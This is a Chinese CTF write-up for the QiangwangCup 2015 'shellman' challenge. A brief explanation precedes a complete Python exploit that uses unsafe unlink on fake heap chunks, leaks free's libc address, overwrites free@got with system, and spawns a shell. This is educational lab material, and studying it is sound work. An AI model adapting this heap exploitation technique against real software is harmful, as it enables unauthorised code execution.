---
title: QiangwangCup-2015-shellman
date: 2016-10-15
tags: [2016,CTFs,unsafe_unlink]
categories: heap
---

## 0x00 Conclusion
- 64位在.bss段上有一个全局数组，该数组保存了每一个经过malloc分配的堆块返回的是否正在使用的标志（1为正在使用）、存储长度、和指向堆数据区的指针(x86下只有指向堆数据区的指针)
![](http://p1.bpimg.com/567571/c51e910ed5029914.png)
- 利用该指针进行任意地址的读和写，这题就是先泄露free函数的真实地址，然后将计算好的system地址，写入free@got中
- 存储指针的全局数组的结构如图所示

```
 p           0   1   2
 |           |   |   |
 +---+---+---+---+---+---+
 |   |   |   | p |   |   | ...
 +---+---+---+---+---+---+
```

## 0x01 Exp##
```python
#!/usr/bin/env python
from zio import *
c_read = COLORED(RAW, 'green')
c_write = COLORED(RAW, 'red')
target = './shellman.b400c663a0ca53f1f6c6fcbf60defa8d'
io = zio(target, print_read = c_read, print_write = c_write, timeout = 100000)

got_free = 0x601600
list_chunk = 0x06016D0
fake_fd = list_chunk - 0x8*3
fake_bk = list_chunk - 0x8*2

def List():
	io.read_until('>')
	io.writeline('1')
	io.read_until('SHELLC0DE 0: ')

def New(shellcode):
	io.read_until('>')
	io.writeline('2')
	io.read_until('Length of new shellcode:')
	io.writeline(str(len(shellcode)))
	io.read_until('Enter your shellcode(in raw format):')
	io.writeline(shellcode)

def Edit(number,shellcode):
	io.read_until('>')
	io.writeline('3')
	io.read_until('Shellcode number:')
	io.writeline(str(number))
	io.read_until('Length of shellcode:')
	io.writeline(str(len(shellcode)))
	io.read_until('Enter your shellcode:')
	io.writeline(shellcode)

def Delete(number):
	io.read_until('>')
	io.writeline('4')
	io.read_until('Shellcode number:')
	io.writeline(str(number))

New('a'*0x80)
New('b'*0x80)


#fake_chunk0
payload = ''
payload += l64(0) + l64(0x81) + l64(fake_fd) + l64(fake_bk)
payload += 'A' * (0x80 - 0x8 * 4)

#fake_chunk1
payload += l64(0x80)+l64(0x90)
Edit(0,payload)

#get bss_pointer
Delete(1)
raw_input('leak')
payload2 = ''
payload2 += 'A' * 0x8 + l64(0x1) + l64(0x8) + l64(got_free)
Edit(0,payload2)
List()

addr_free = l64(io.read(16).decode('hex'))
print 'addr_free = '+hex(addr_free)
offset_free = 0x82d00
offset_system = 0x46590
base_libc = addr_free - offset_free
addr_system = base_libc + offset_system
print 'addr_system = ' + hex(addr_system)

raw_input('tamper')
Edit(0,l64(addr_system))
New('/bin/sh\x00')
Delete(1)

io.interact()
```

## 0x02 Reference

- [http://fanrong1992.github.io/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free/](http://fanrong1992.github.io/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free/)
- [http://wooyun.tangscan.cn/static/drops/tips-7326.html](http://wooyun.tangscan.cn/static/drops/tips-7326.html)
